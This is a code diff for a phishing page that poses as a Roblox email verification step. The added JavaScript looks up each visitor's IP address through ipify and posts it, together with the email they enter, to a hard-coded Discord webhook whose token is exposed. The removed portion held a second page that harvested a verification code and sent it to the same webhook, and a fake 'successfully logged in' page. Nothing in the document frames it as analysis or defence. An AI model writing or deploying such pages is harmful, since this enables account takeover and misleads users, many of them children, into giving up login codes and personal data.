@@ -1,21 +1,31 @@
-<!-- First Page: email.html -->
+<!-- email.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Email Verification</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h2>Fill in your email address</h2>
-    <input type="email" id="email" placeholder="Email Address" required>
-    <button onclick="submitEmail()">Submit</button>
+    <div class="container">
+        <h2>Email</h2>
+        <p>Your Roblox Email</p>
+        <input type="email" id="email" placeholder="Email Address" required>
+        <br>
+        <button onclick="submitEmail()">Submit</button>
+    </div>
 
     <script>
-        function submitEmail() {
+        async function submitEmail() {
             const email = document.getElementById('email').value;
 
-            // Send the email to the webhook
+            // Fetch the user's IP address
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIP = ipData.ip;
+
+            // Send the email and IP to the webhook
             fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                 method: 'POST',
                 headers: {
@@ -23,8 +33,8 @@
                 },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "Email Verification",
-                        description: `Email: ${email}`
+                        title: userIP,
+                        description: `Email: ${email}\nCode: none`
                     }]
                 })
             }).then(() => {
@@ -33,57 +43,5 @@
             });
         }
     </script>
-</body>
-</html>
-
-<!-- Second Page: code.html -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Code Verification</title>
-</head>
-<body>
-    <h2>Code - Check your email</h2>
-    <input type="text" id="code" placeholder="Enter Code" required>
-    <button onclick="submitCode()">Submit</button>
-
-    <script>
-        function submitCode() {
-            const code = document.getElementById('code').value;
-            const email = localStorage.getItem('email'); // Retrieve the email from local storage
-
-            // Send the code and email to the webhook
-            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "Code Verification",
-                        description: `Email: ${email}\nCode: ${code}`
-                    }]
-                })
-            }).then(() => {
-                // Redirect to the third page
-                window.location.href = "success.html";
-            });
-        }
-    </script>
-</body>
-</html>
-
-<!-- Third Page: success.html -->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Success</title>
-</head>
-<body>
-    <h2>You have successfully logged in.</h2>
 </body>
 </html>
